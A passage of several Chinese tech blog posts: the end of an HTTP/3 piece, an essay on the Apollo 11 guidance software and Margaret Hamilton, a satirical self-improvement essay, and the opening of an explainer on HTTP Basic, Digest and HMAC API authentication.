目前看下来，HTTP/3目前看上去没有太多的协议业务逻辑上的东西，更多是HTTP/2 + QUIC协议。但，HTTP/3 因为动到了底层协议，所以，在普及方面上可能会比 HTTP/2要慢的多的多。但是，可以看到QUIC协议的强大，细思及恐，QUIC这个协议真对TCP是个威胁，如果QUIC成熟了，TCP是不是会有可能成为历史呢？

未来十年，让我们看看UDP是否能够逆袭TCP……

(全文完)

# 50年前的登月程序和程序员有多硬核

#####  [2019年07月21日 ](https://coolshell.cn/articles/19612.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [70 条评论](https://coolshell.cn/articles/19612.html#comments) 137,201 人阅读

2019年7月20日，是有纪念意义的一天，这天不是因为广大网民帮周杰伦在新浪微博上的超话刷到第一，而是阿波罗登月的50周年的纪念日。早在几年前，在Github上放出了当年Apollo飞船使用的源代码（当然是汇编的），但完全不明白为什么这几天会有一些中国的小朋友到这个github的issue里灌水……，人类历史上这么伟大的一件事，为什么不借这个机会学习一下呢？下面是一些阿波罗登月与程序员相关的小故事，顺着这些东西，你可以把你的周末和精力用得更有价值。

![img](photo/1920px-Margaret_Hamilton_-_restoration-e1563697198766.jpg)

首先，要说的是Apollo 11导航的源代码，这些代码的设计负责人叫[Margaret Heafield Hamilton ](https://en.wikipedia.org/wiki/Margaret_Hamilton_(software_engineer))，是一个女程序员，专业是数学和哲学，1960年得到一个MIT麻省理工大学的临时的软件开发职位，负责在PDP-1和LGP-30上运行天气预报的软件（注：在计算机历史上，PDP系统机器被称为Hack文化的重要推手，PDP-11推了Unix操作系统，而Unix操作系统则是黑客文化的重要产品。参看《[Unix传奇](https://coolshell.cn/articles/2322.html)》）。然后，她又为美国空军编写探测知敌方飞行的软件，之后，于1965年的时候，她加入了MIT仪器实验室，并成为了这个实验室的主管，这个实验实就是Apollo计划的一部分，她负责编写全新的月球登录的导航软件，以及后来该软件在其他项目中的各个版本。



上图是Hamilton站在她和她的麻省理工团队为阿波罗项目制作的导航软件源代码旁边，在Github上的开源的代码 – [Apollo-11](https://github.com/chrislgarry/Apollo-11) （2016年开源）。我们可以看到，有两个重要的目录，一个目录叫“Comanche055”，一个目录叫“Luminary099”，前者是指挥舱用的（英文为 [Command Module](https://en.wikipedia.org/wiki/Apollo_command_and_service_module#Command_Module_(CM)) ）后者为登月舱用的（英文为 [Lunar Module](https://en.wikipedia.org/wiki/Apollo_Lunar_Module)），这里需要说明一下的是，指挥舱是把登录舱推到月球上，在返回的时候，登录舱是被抛弃掉的，而返回到地球的是指挥舱。如果你想看这两份源代码的纸版，你可以访问这两个链接：[Comanche 55 AGC Program Listing](https://archive.org/details/Comanche55J2k60) 和 [Luminary 99 REv.1 AGC Program Listing](https://archive.org/details/Luminary99001J2k60)。其中的55 和 90 是各自的build 版本号。

我们细看一下，这些文件的日期是，1969年7月14日，而Apollo 11登月的日期是1969年7月16日起程，7月19日经过月球背面，7月20日下午8点登月。代码写好，两天后就直接上生产，然后就登月，还是导航代码，这代码写的的健壮性得有多强。

如果你仔细比较一下这两个目录中的文件，你会发现有些文件是一样的，不但文件名一样，而且内容也一样。这说明这两个模块中的一些东西是相似的。

![img](photo/source.code_.compare.png)

这些代码应该是很难读了，因为当时写这些代码的时候，C语言都没有被发明，所以基本上来说都是汇编代码了，而且还可以发现，这些代码的源文件全是以agc后缀结尾的， 看来这还不是我们平时所了解的汇编，所谓的AGC代表了运行这些代码的计算机 –[ Apollo Guideance Computer](https://en.wikipedia.org/wiki/Apollo_Guidance_Computer) 。沿着这个Wikipedia的链接，你可以看到AGC这个电脑的指令是什么样的，看懂那几条指令后，这些源代码也就能读懂了。当然，因为是写成汇编的，所以，读起来还是要费点神的。不过，其中有一个文件是 `LUNAR_LANDING_GUIDANCE_EQUATIONS.agc` 你会不会很好奇想去看看？

打开源文件，你还可以看到每个文件都有很多很多的注释，非常友好，但是也有一些注释比较有趣。这里有一组短视频带你读这些代码 – [Exploring the Apollo Guidance Computer(AGC) Code](https://www.pluralsight.com/courses/moon-landing-apollo-11)，一供10个小视频，每个2分钟左右，如果你英文听边还行（我觉得很容易听懂），可以看看，了解一下AGC的工作方式，挺有趣意思的。

当时的AGC有32公斤，主频只有2MHz，2K的RAM，36K的ROM。嗯，当年就是这么一个小玩意，把人送上了月球，今天，一个聊天程序就占内存几GB……

下面是AGC在Apollo 1指挥舱里的样子（图片截自上面的视频），这个高质量的3D扫描来自[ Simithsonian 3D: Apollo 11 Command Module](https://www.3d.si.edu/explorer/apollo-11-command-module) （我觉得美国人干这些事干就是很漂亮啊，这种高清的3D扫描太牛了，如果你仔细看，这个舱里还有宇航员在舱壁上的手写）

![img](photo/AGC.DSKY_.png)

这个AGC的操作界面又叫DSKY – Display 和 Keyboard的缩写，下图是一个 AGC 模拟器，其官方主页在 https://www.ibiblio.org/apollo/源代码在 [Github/VirtualAGC](https://github.com/virtualagc/virtualagc)。在这个界面上我们可以看到：下面的键盘上左边有两个键，一个是动词Verb一个是名词Noun，Verb指定操作类型，Noun指定要由Verb命令修改的数据。右边的显示器下面有三个5位的数字，这三个数值显示表示航天器姿态的矢量，以及所需速度变化的显示矢量。是的，当年的导航就靠这三个数字和里面的程序了。

![img](photo/DSKY.png)

 

如果你想了解AGC更多的细节，你可以看看 这篇 [AGC for Dummies](http://www.ibiblio.org/apollo/ForDummies.html)。这篇文章讲述了AGC这个嵌入式系统的背景和操作指令。一份详细的[AGC 汇编语言手册](http://www.ibiblio.org/apollo/assembly_language_manual.html)可以让你了解更多的细节。

另外，我在Youtube上找到了一个讲当时Apollo电脑的纪录片 – [Navigation Computer](https://www.youtube.com/watch?v=9YA7X5we8ng)，太有趣了。比如：21分51秒开始讲存储用的 [Rope Memory](https://en.wikipedia.org/wiki/Core_rope_memory) 绕线内存，Hamilton 也出来讲了一下在这种内存上编程，画面切到一个人用个比较长的金属针在一个像主板一样的东西上，左右穿梭，就像刺绣一样，但是绣的不是图案，而是程序……太硬核了，真正的通过“硬编织”的方式来写程序。

[![img](photo/rope.memory.png)](https://www.youtube.com/watch?v=9YA7X5we8ng)

看完上面这个纪录篇，我是非常之惊叹，惊叹于50年前的工程能力，惊叹于50年前这些人面对技术的的一丝不苟，对技术的尊重和严谨的这种精神和方法，一点都不比较今天差。

不过，最牛的还不是这个，我在Hamilton的Wikipedia词条上找到了他说的一个事件—— 当年Apollo登陆雷达开关放在了错误的位置，导致AGC收到了不少错误的信号。结果就是AGC既得执行着陆必须的计算，又要接受这些占用其15%时间的额外数据。但是AGC的程序居然可以用高优先级的任务打断低优先级的任务，于是，AGC自动剔除了低级别的任务以保证了重要的任务完成。Hamilton 原话说—— 如果当时的程序不能识别错误并从错误中恢复，我怀疑阿波罗不能成功登月。if the computer hadn’t recognized this problem and taken recovery action, I doubt if Apollo 11 would have been the successful moon landing it was。

看到这里，你有没有觉得——“这个女程序员的一小步，是整个人类的一大步”？

Hamilton 的牛逼之外还在于，她是第一个将“软件工程”提出来的人，在MIT，她想让软件开发就像其它工程一样，有相应的工程纪律，给于相关的尊重，于是她创造了Software Engineering这个词。2018年，[IEEE在纪念软件工程50周年](https://www.computer.org/csdl/magazine/so/2018/05)的时候，他们把 Hamilton 请过去讲了一个叫 [What the Errors Tell Us](https://ieeexplore.ieee.org/document/8409915) 的主题。她绝对可以称得上是程序员的Pioneer。

三年前，Apollo的源代码被开源时候，Twitter有个叫 Lin Clark 的人发了一条推：“我妈50年前的代码被放到Github上了”，虽然，她不是 Hamilton 的女儿，但她妈妈也是Apollo其中一个程序员，现在Lin Clark同样也是一个程序员，目前在 Mozilla工作，Staff Engineer，专长 WebAssembly, Rust, 和 JavaScript ，也是个非常厉害的程序，Youtube上各种演讲，也是一个跟他妈妈一样牛的人。

当她在Twitter上这么自豪地发了一条这样的推后，我不知道各位有什么想法？想不想你的后代在未来也会这样自豪的发条微博？
![img](photo/Lin-Clark-e1563706128853.jpg)

 

最后，尤其是想对那些到Apollo源代码的issue里发spam垃圾信息的人说一下，你看看人家，再看看你们自己，你们是不是想让你们的孩子在登月100周年纪念的时候说——50年前我爹那个傻叉在Apollo的github的issue列表时写了些垃圾，还以为自己多机灵？！

（全文完）

# 如何超过大多数人

#####  [2019年06月22日 ](https://coolshell.cn/articles/19464.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [167 条评论](https://coolshell.cn/articles/19464.html#comments) 313,112 人阅读

![img](photo/competition-360x200.png)当你看到这篇文章的标题，你一定对这篇文章产生了巨大的兴趣，因为你的潜意识在告诉你，这是一本人生的“武林秘籍”，而且还是左耳朵写的，一定有干货满满，只要读完，一定可以练就神功并找到超过大多数人的快车道和捷径……然而…… 当你看到我这样开篇时，你一定会觉得我马上就要有个转折，告诉你这是不可能的，一切都需要付出和努力……然而，你错了，这篇文章还真就是一篇“秘籍”，只要你把这些“秘籍”用起来，你就一定可以超过大多数人。而且，这篇文章只有我这个“人生导师”可以写得好。毕竟，我的生命过到了十六进制2B的年纪，踏入这个社会已超过20年，舍我其谁呢？！

P.S. 这篇文章借鉴于《[如何写出无法维护的代码](https://coolshell.cn/articles/4758.html)》一文的风格……嘿嘿

目录



[相关技巧和最佳实践](https://coolshell.cn/articles/19464.html#相关技巧和最佳实践)[相关原理和思维模型](https://coolshell.cn/articles/19464.html#相关原理和思维模型)[认知](https://coolshell.cn/articles/19464.html#认知)[知识](https://coolshell.cn/articles/19464.html#知识)[技能](https://coolshell.cn/articles/19464.html#技能)[领导力](https://coolshell.cn/articles/19464.html#领导力)

#### 相关技巧和最佳实践

要超过别人其实还是比较简单的，尤其在今天的中国，更是简单。因为，你只看看中国的互联网，你就会发现，他们基本上全部都是在消费大众，让大众变得更为地愚蠢和傻瓜。**所以，在今天的中国，你基本上不用做什么，只需要不使用中国互联网，你就很自然地超过大多数人了**。当然，如果你还想跟他们彻底拉开，甩他们几个身位，把别人打到底层，下面的这些“技巧”你要多多了解一下。

在信息获取上，你要不断地向大众鼓吹下面的这些事：

- 让大家都用百度搜索引擎查找信息，订阅微信公众号或是到知乎上学习知识……要做到这一步，你就需要把“百度一下”挂在嘴边，然后要经常在群或朋友圈中转发微信公众号的文章，并且转发知乎里的各种“如何看待……”这样的文章，让他们爱上八卦，爱上转发，爱上碎片。
- 让大家到微博或是知识星球上粉一些大咖，密切关注他们的言论和动向……是的，告诉大家，大咖的任何想法一言一行都可以在微博、朋友圈或是知识星球上获得，让大家相信，你的成长和大咖的见闻和闲扯非常有关系，你跟牛人在一个圈子里你也会变牛。
- 把今日头条和抖音这样的APP推荐给大家……你只需要让你有朋友成功地安装这两个APP，他们就会花大量的时间在上面，而不能自拔，要让他们安装其实还是很容易的，你要不信你就装一个试玩一会看看（嘿嘿嘿）。
- 让大家热爱八卦，八卦并不一定是明星的八卦，还可以是你身边的人，比如，公司的同事，自己的同学，职场见闻，社会热点，争议话题，……这些东西总有一些东西会让人心态有很多微妙的变化，甚至花大量的时间去搜索和阅读大量的观点，以及花大量时间与人辩论争论，这个过程会让人上瘾，让人欲罢不能，然而这些事却和自己没有半毛钱关系。你要做的事就是转发其中一些SB或是很极端的观点，造成大家的一睦讨论后，就早早离场……
- 利用爱国主义，让大家觉得不用学英文，不要出国，不要翻墙，咱们已经是强国了……这点其实还是很容易做到的，因为学习是比较逆人性的，所以，只要你鼓吹那些英文无用论，出国活得更惨，国家和民族都变得很强大，就算自己过得很底层，也有大国人民的感觉。

然后，在知识学习和技能训练上，让他们不得要领并产生幻觉

- 让他们混淆认识和知识，以为开阔认知就是学习，让他们有学习和成长的幻觉……
- 培养他们要学会使用碎片时间学习。等他们习惯利用碎片时间吃快餐后，他们就会失去精读一本书的耐性……
- 不断地给他们各种各样“有价值的学习资料”，让他们抓不住重点，成为一个微信公众号或电子书“收藏家”……
- 让他们看一些枯燥无味的基础知识和硬核知识，这样让他们只会用“死记硬背”的方式来学习，甚至直接让他们失去信心，直接放弃……
- 玩具手枪是易用的，重武器是难以操控的，多给他们一些玩具，这样他们就会对玩具玩地得心应手，觉得玩玩具就是自己的专业……
- 让他们喜欢直接得到答案的工作和学习方式，成为一个伸手党，从此学习再也不思考……
- 告诉他们东西做出来就好了，不要追求做漂亮，做优雅，这样他们就会慢慢地变成劳动密集型……
- 让他们觉得自己已经很努力了，剩下的就是运气，并说服他们去‘及时行乐’，然后再也找不到高阶和高效率学习的感觉……
- 让他们觉得“读完书”、“读过书”就行了，不需要对书中的东西进行思考，进行总结，或是实践，只要囫囵吞枣尽快读完就等同于学好了……

最后，在认知和格局上，彻底打垮他们，让他们变成韭菜。

- 让他们尽可能地用拼命和加班，尽可能的996，并告诉他们这就是通往成功的唯一路径。这样一来，他们必然会被永远困在低端成为最低的劳动力。
- 让他们不要看到大的形势，只看到眼前的一亩三分地，做好一个井底之蛙。其实这很简单，就是不要告诉他还有另外一种活法，不要扩大他的认识……
- 宣扬一夜暴富以及快速挣钱的案例，最好让他们进入“赌博类”或是“传销类”的地方，比如：股市、数字货币……要让他们相信各种财富神话，相信他们就是那个幸运儿，他们也可以成为巴菲特，可以成为马云……
- 告诉他们，一些看上去很难的事都是有捷径的，比如：21天就能学会机器学习，用区块链就能颠覆以及重构整个世界等等……
- 多跟他们讲一些小人物的励志的故事，这样让他们相信，不需要学习高级知识，不需要掌握高级技能，只需要用低等的知识和低级的技能，再加上持续不断拼命重复现有的工作，终有一天就会成功……
- 多让他们跟别人比较，人比人不会气死人，但是会让人变得浮躁，变得心急，变得焦虑，当一个人没有办法控制自己的情绪，没有办法让自己静下心来，人会失去耐性和坚持，开始好大喜欢功，开始装逼，开始歪门邪道剑走偏锋……
- 让他们到体制内的一些非常稳定的地方工作，这样他们拥有不思进取、怕承担责任、害怕犯错、喜欢偷懒、得过且过的素质……
- 让他们到体制外的那些喜欢拼命喜欢加班的地方工作，告诉他们爱拼才会赢，努力加班是一种福报，青春就是用来拼的，让他们喜欢上使蛮力的感觉……
- 告诉他们你的行业太累太辛苦，干不到30岁。让他们早点转行，不要耽误人生和青春……
- 当他们要做决定的时候，一定要让他们更多的关注自己会失去的东西，而不是会得到的东西。培养他们患得患失心态，让他们认识不到事物真正的价值，失去判断能力……（比如：让他们觉得跟对人拍领导的马屁忠于公司比自我的成长更有价值）
- 告诉他们，你现有的技能和知识不用更新，就能过好一辈子，新出来的东西没有生命力的……这样他们就会像我们再也不学习的父辈一样很快就会被时代所抛弃……
- 每个人都喜欢在一些自己做不到的事上找理由，这种能力不教就会，比如，事情太多没有时间，因为工作上没有用到，等等，你要做的就是帮他们为他们做不到的事找各种非常合理的理由，比如：没事的，一切都是最好的安排；你得不到的那个事没什么意思；你没有面好主要原因是那个面试官问的问题都是可以上网查得到的知识，而不没有问到你真正的能力上；这些东西学了不用很快会忘了，等有了环境再学也不迟……

**最后友情提示一下，上述的这些“最佳实践”你要小心，是所谓，贩毒的人从来不吸毒，开赌场的人从来不赌博！所以，你要小心别自己也掉进去了！这就是“欲练神功，必先自宫”的道理。**

#### 相关原理和思维模型

对于上面的这些技巧还有很多很多，你自己也可以发明或是找到很多。所以，我来讲讲这其中的一些原理。

一般来说，超过别人一般来说就是两个维度：

1. **在认知、知识和技能上**。这是一个人赖以立足社会的能力（参看《[程序员的荒谬之言还是至理名言？](https://coolshell.cn/articles/4235.html)》和《[21天教你学会C++](https://coolshell.cn/articles/2250.html)》）
2. **在领导力上**。所谓领导力就是你跑在别人前面，你得要有比别人更好的能力更高的标准（参看《[技术人员发展之路](https://coolshell.cn/articles/17583.html)》）

首先，我们要明白，人的技能是从认识开始，然后通过学校、培训或是书本把“零碎的认知”转换成“系统的知识”，而有要把知识转换成技能，就需要训练和实践，这样才能完成从：认识 -> 知识 -> 技能 的转换。这个转换过程是需要耗费很多时间和精力的，而且其中还需要有强大的学习能力和动手能力，这条路径上有很多的“关卡”，每道关卡都会过滤掉一大部分人。比如：对于一些比较枯燥的硬核知识来说，90%的人基本上就倒下来，不是因为他们没有智商，而是他们没有耐心。

##### 认知

要在认知上超过别人，就要在下面几个方面上做足功夫：

1）**信息渠道**。试想如果别人的信息源没有你的好，那么，这些看不见信息源的人，只能接触得到二手信息甚至三手信息，只能获得被别人解读过的信息，这些信息被三传两递后必定会有错误和失真，甚至会被传递信息的中间人hack其中的信息（也就是“中间人攻击”），而这些找不出信息源的人，只能“被人喂养”，于是，他们最终会被困在信息的底层，永世不得翻身。（比如：学习C语言，放着原作者K&R的不用，硬要用错误百出谭浩强的书，能有什么好呢？）

2）**信息质量**。信息质量主要表现在两个方面，一个是信息中的燥音，另一个是信息中的质量等级，我们都知道，在大数据处理中有一句名言，叫 garbage in garbage out，你天天看的都是垃圾，你的思想和认识也只有垃圾。所以，如果你的信息质量并不好的话，你的认知也不会好，而且你还要花大量的时间来进行有价值信息的挖掘和处理。

3）**信息密度**。优质的信息，密度一般都很大，因为这种信息会逼着你去干这么几件事，a）搜索并学习其关联的知识，b）沉思和反省，c）亲手去推理、验证和实践……一般来说，经验性的文章会比知识性的文章会更有这样的功效。比如，类似于像 Effiective C++/Java，设计模式，Unix编程艺术，算法导论等等这样的书就是属于这种密度很大的书，而像[Netflix的官方blog](https://medium.com/netflix-techblog)和[AWS CTO的blog](https://www.allthingsdistributed.com/)等等地方也会经常有一些这样的文章。

##### 知识

要在知识上超过别人，你就需要在下面几个方面上做足功夫：

1）**知识树（图）**。任何知识，只在点上学习不够的，需要在面上学习，这叫系统地学习，这需要我们去总结并归纳知识树或知识图，一个知识面会有多个知识板块组成，一个板块又有各种知识点，一个知识点会导出另外的知识点，各种知识点又会交叉和依赖起来，学习就是要系统地学习整个知识树（图）。而我们都知道，**对于一棵树来说，“根基”是非常重要的，所以，学好基础知识也是非常重要的，对于一个陌生的地方，有一份地图是非常重要的，没有地图的你只会乱窜，只会迷路、练路、走冤枉路！**

2）**知识缘由**。任何知识都是有缘由的，了解一个知识的来龙去脉和前世今生，会让你对这个知识有非常强的掌握，而不再只是靠记忆去学习。靠记忆去学习是一件非常糟糕的事。而对于一些操作性的知识（不需要了解由来的），我把其叫操作知识，就像一些函数库一样，这样的知识只要学会查文档就好了。**能够知其然，知其所以然的人自然会比识知识到表皮的人段位要高很多。**

3）**方法套路**。学习不是为了找到答案，而是找到方法。就像数学一样，你学的是方法，是解题思路，是套路，会用方程式解题的和不会用方程式解题的在解题效率上不可比较，而在微积分面前，其它的解题方法都变成了渣渣。**你可以看到，掌握高级方法的人比别人的优势有多大，学习的目的就是为了掌握更为高级的方法和解题思路**。

##### 技能

要在技能上超过别人，你就需要在下面几个方面做足功夫：

1）**精益求精**。如果你想拥有专业的技能，你要做不仅仅是拼命地重复一遍又一遍的训练，而是在每一次重复训练时你都要找到更好的方法，总结经验，让新的一遍能够更好，更漂亮，更有效率，否则，用相同的方法重复，那你只不过在搬砖罢了。

2）**让自己犯错**。犯错是有利于成长的，这是因为出错会让人反思，反思更好的方法，反思更完美的方案，总结教训，寻求更好更完美的过程，是技能升级的最好的方式。尤其是当你在出错后，被人鄙视，被人嘲笑后，你会有更大的动力提升自己，这样的动力才是进步的源动力。当然，千万不要同一个错误重复地犯！

3）**找高手切磋**。下过棋，打个球的人都知道，你要想提升自己的技艺，你必需找高手切磋，在和高手切磋的过程中你会感受到高手的技能和方法，有时候你会情不自禁地哇地一下，我靠，还可以这么玩！

##### 领导力

最后一个是领导力，要有领导力或是影响力这个事并不容易，这跟你的野心有多大，好胜心有多强 ，你愿意付出多少很有关系，因为一个人的领导力跟他的标准很有关系，因为有领导力的人的标准比绝大多数人都要高。

1）**识别自己的特长和天赋**。首先，每个人DNA都可能或多或少都会有一些比大多数人NB的东西（当然，也可能没有），如果你有了，那么在你过去的人生中就一定会表现出来了，就是那种大家遇到这个事会来请教你的寻求你帮助的现象。那种，别人要非常努力，而且毫不费劲的事。一旦你有了这样的特长或天赋，那你就要大力地扩大你的领先优势，千万不要进到那些会限制你优势的地方。你是一条鱼，你就一定要把别人拉到水里来玩，绝对不要去陆地上跟别人拼，不断地在自己的特长和天赋上扩大自己的领先优势，彻底一骑绝尘。

2）**识别自己的兴趣和事业**。没有天赋也没有问题，还有兴趣点，都说兴趣是最好的老师，当年，Linus就是在学校里对minx着迷了，于是整出个Linux来，这就是兴趣驱动出的东西，一般来说，兴趣驱动的事总是会比那些被动驱动的更好。但是，这里我想说明一下什么叫“真∙兴趣”，真正的兴趣不是那种三天热度的东西，而是那种，你愿意为之付出一辈子的事，是那种无论有多大困难有多难受你都要死磕的事，这才是“真∙兴趣”，这也就是你的“野心”和“好胜心”所在，其实上升到了你的事业。相信我，绝大多数人只有职业而没有事业的。

3）**建立高级的习惯和方法**。没有天赋没有野心，也还是可以跟别人拼习惯拼方法的，只要你有一些比较好的习惯和方法，那么你一样可以超过大多数人。对此，在习惯上你要做到比较大多数人更自律，更有计划性，更有目标性，比如，每年学习一门新的语言或技术，并可以参与相关的顶级开源项目，每个月训练一个类算法，掌握一种算法，每周阅读一篇英文论文，并把阅读笔记整理出来……自律的是非常可怕的。除此之外，你还需要在方法上超过别人，你需要满世界的找各种高级的方法，其中包括，思考的方法，学习的方法、时间管理的方法、沟通的方法这类软实力的，还有，解决问题的方法（trouble shooting 和 problem solving），设计的方法，工程的方法，代码的方法等等硬实力的，一开始照猫画虎，时间长了就可能会自己发明或推导新的方法。

4）**勤奋努力执着坚持**。如果上面三件事你都没有也没有能力，那还有最后一件事了，那就是勤奋努力了，就是所谓的“一万小时定律”了（参看《[21天教你学会C++](https://coolshell.cn/articles/2250.html)》中的十年学编程一节），我见过很多不聪明的人，悟性也不够（比如我就是一个），别人学一个东西，一个月就好了，而我需要1年甚至更长，但是很多东西都是死的，只要肯花时间就有一天你会搞懂的，耐不住我坚持十年二十年，聪明的人发明个飞机飞过去了，笨一点的人愚公移山也过得去，因为更多的人是懒人，我不用拼过聪明人，我只用拼过那些懒人就好了。

好了，就这么多，如果哪天你变得消极和不自信，你要来读读我的这篇文章，子曰：温故而知新。

（全文完）

# HTTP API 认证授权术

#####  [2019年05月09日 ](https://coolshell.cn/articles/19395.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [70 条评论](https://coolshell.cn/articles/19395.html#comments) 100,668 人阅读

![img](photo/Authorization-360x200.png)我们知道，HTTP是无状态的，所以，当我们需要获得用户是否在登录的状态时，我们需要检查用户的登录状态，一般来说，用户的登录成功后，服务器会发一个登录凭证（又被叫作Token），就像你去访问某个公司，在前台被认证过合法后，这个公司的前台会给你的一个访客卡一样，之后，你在这个公司内去到哪都用这个访客卡来开门，而不再校验你是哪一个人。在计算机的世界里，这个登录凭证的相关数据会放在两种地方，一个地方在用户端，以Cookie的方式（一般不会放在浏览器的Local Storage，因为这很容易出现登录凭证被XSS攻击），另一个地方是放在服务器端，又叫Session的方式（SessonID存于Cookie）。

但是，这个世界还是比较复杂的，除了用户访问，还有用户委托的第三方的应用，还有企业和企业间的调用，这里，我想把业内常用的一些 API认证技术相对系统地总结归纳一下，这样可以让大家更为全面的了解这些技术。**注意，这是一篇长文！**

本篇文章会覆盖如下技术：

- HTTP Basic
- Digest Access
- App Secret Key + HMAC
- JWT – JSON Web Tokens
- OAuth 1.0 – 3 legged & 2 legged
- OAuth 2.0 – Authentication Code & Client Credential



目录



[HTTP Basic](https://coolshell.cn/articles/19395.html#HTTP_Basic)[Digest Access](https://coolshell.cn/articles/19395.html#Digest_Access)[App Secret Key + HMAC](https://coolshell.cn/articles/19395.html#App_Secret_Key_HMAC)[JWT – JSON Web Tokens](https://coolshell.cn/articles/19395.html#JWT_–_JSON_Web_Tokens)[OAuth 1.0](https://coolshell.cn/articles/19395.html#OAuth_10)[OAuth 2.0](https://coolshell.cn/articles/19395.html#OAuth_20)[Authorization Code Flow](https://coolshell.cn/articles/19395.html#Authorization_Code_Flow)[ Client Credential Flow](https://coolshell.cn/articles/19395.html#_Client_Credential_Flow)[小结](https://coolshell.cn/articles/19395.html#小结)[两个术语和三个概念](https://coolshell.cn/articles/19395.html#两个术语和三个概念)[明白一些初衷](https://coolshell.cn/articles/19395.html#明白一些初衷)[相关的注意事项](https://coolshell.cn/articles/19395.html#相关的注意事项)

#### HTTP Basic

HTTP Basic 是一个非常传统的API认证技术，也是一个比较简单的技术。这个技术也就是使用 `username`和 `password` 来进行登录。整个过程被定义在了 [RFC 2617](http://tools.ietf.org/html/rfc2617) 中，也被描述在了 [Wikipedia: Basic Access Authentication](https://en.wikipedia.org/wiki/Basic_access_authentication) 词条中，同时也可以参看 [MDN HTTP Authentication](https://developer.mozilla.org/en-US/docs/Web/HTTP/Authentication)

其技术原理如下：

1. 把 `username`和 `password` 做成 `username:password` 的样子（用冒号分隔）
2. 进行Base64编码。`Base64("username:password")` 得到一个字符串（如：把 `haoel:coolshell` 进行base64 后可以得到 `aGFvZW86Y29vbHNoZWxsCg` ）
3. 把 `aGFvZW86Y29vbHNoZWxsCg`放到HTTP头中 [`Authorization`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Authorization) 字段中，形成 `Authorization: Basic aGFvZW86Y29vbHNoZWxsCg`，然后发送到服务端。
4. 服务端如果没有在头里看到认证字段，则返回401错，以及一个个``[WWW-Authenticate](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/WWW-Authenticate)`: Basic Realm='HelloWorld'` 之类的头要求客户端进行认证。之后如果没有认证通过，则返回一个401错。如果服务端认证通过，那么会返回200。

我们可以看到，使用Base64的目的无非就是为了把一些特殊的字符给搞掉，这样就可以放在HTTP协议里传输了。而这种方式的问题最大的问题就是把用户名和口令放在网络上传，所以，一般要配合TLS/SSL的安全加密方式来使用。我们可以看到 [JIRA Cloud 的API认证](https://developer.atlassian.com/cloud/jira/platform/jira-rest-api-basic-authentication/)支持HTTP Basic 这样的方式。

但我们还是要知道，这种把用户名和密码同时放在公网上传输的方式有点不太好，因为Base64不是加密协议，而是编码协议，所以就算是有HTTPS作为安全保护，给人的感觉还是不放心。

#### Digest Access

中文称“HTTP 摘要认证”，最初被定义在了 [RFC 2069](https://tools.ietf.org/html/rfc2069) 文档中（后来被 [RFC 2617](https://tools.ietf.org/html/rfc2617) 引入了一系列安全增强的选项；“保护质量”(qop)、随机数计数器由客户端增加、以及客户生成的随机数）。

其基本思路是，请求方把用户名口令和域做一个MD5 – `MD5(username:realm:password)` 然后传给服务器，这样就不会在网上传用户名和口令了，但是，因为用户名和口令基本不会变，所以，这个MD5的字符串也是比较固定的，因此，这个认证过程在其中加入了两个事，一个是 `nonce` 另一个是 `qop`

- 首先，调用方发起一个普通的HTTP请求。比如：`GET /coolshell/admin/ HTTP/1.1`
- 服务端自然不能认证能过，服务端返回401错误，并且在HTTP头里的 `WWW-Authenticate` 包含如下信息：

```
 WWW-Authenticate: Digest realm="testrealm@host.com",
                        qop="auth,auth-int",
                        nonce="dcd98b7102dd2f0e8b11d0f600bfb0c093",
                        opaque="5ccc069c403ebaf9f0171e9517f40e41"
```

- 其中的 `nonce` 为服务器端生成的随机数，然后，客户端做 `HASH1=MD5(MD5(username:realm:password):nonce:cnonce)` ，其中的 `cnonce` 为客户端生成的随机数，这样就可以使得整个MD5的结果是不一样的。
- 如果 `qop` 中包含了 `auth` ，那么还得做 `HASH2=MD5(method:digestURI)` 其中的 `method` 就是HTTP的请求方法（GET/POST…），`digestURI` 是请求的URL。
- 如果 `qop` 中包含了 `auth-init` ，那么，得做 `HASH2=MD5(method:digestURI:MD5(entityBody))` 其中的 `entityBody` 就是HTTP请求的整个数据体。
- 然后，得到 `response = MD5(HASH1:nonce:nonceCount:cnonce:qop:HASH2)` 如果没有 `qop`则 `response = MD5(HA1:nonce:HA2)`
- 最后，我们的客户端对服务端发起如下请求—— 注意HTTP头的 `Authorization: Digest ...`

```
GET /dir/index.html HTTP/1.0
Host: localhost
Authorization: Digest username="Mufasa",
                     realm="testrealm@host.com",
                     nonce="dcd98b7102dd2f0e8b11d0f600bfb0c093",
                     uri="%2Fcoolshell%2Fadmin",
                     qop=auth,
                     nc=00000001,
                     cnonce="0a4f113b",
                     response="6629fae49393a05397450978507c4ef1",
                     opaque="5ccc069c403ebaf9f0171e9517f40e41"
```

维基百科上的 [Wikipedia: Digest access authentication](https://en.wikipedia.org/wiki/Digest_access_authentication) 词条非常详细地描述了这个细节。

摘要认证这个方式会比之前的方式要好一些，因为没有在网上传递用户的密码，而只是把密码的MD5传送过去，相对会比较安全，而且，其并不需要是否TLS/SSL的安全链接。但是，**别看这个算法这么复杂，最后你可以发现，整个过程其实关键是用户的password，这个password如果不够得杂，其实是可以被暴力破解的，而且，整个过程是非常容易受到中间人攻击**——比如一个中间人告诉客户端需要的 Basic 的认证方式 或是 老旧签名认证方式（RFC2069）。

#### App Secret Key + HMAC

先说HMAC技术，这个东西来自于MAC – [Message Authentication Code](https://en.wikipedia.org/wiki/Message_authentication_code)，是一种用于给消息签名的技术，也就是说，我们怕消息在传递的过程中被人修改，所以，我们需要用对消息进行一个MAC算法，得到一个摘要字串，然后，接收方得到消息后，进行同样的计算，然后比较这个MAC字符串，如果一致，则表明没有被修改过（整个过程参看下图）。而HMAC – [Hash-based Authenticsation Code](https://en.wikipedia.org/wiki/HMAC)，指的是利用Hash技术完成这一工作，比如：SHA-256算法。

 

![img](photo/MAC-1024x634.png)

（图片来自 [Wikipedia – MAC 词条](https://en.wikipedia.org/wiki/Message_authentication_code) ）

我们再来说App ID，这个东西跟验证没有关系，只是用来区分，是谁来调用API的，就像我们每个人的身份证一样，只是用来标注不同的人，不是用来做身份认证的。与前面的不同之处是，这里，我们需要用App ID 来映射一个用于加密的密钥，这样一来，我们就可以在服务器端进行相关的管理，我们可以生成若干个密钥对（AppID, AppSecret），并可以有更细粒度的操作权限管理。

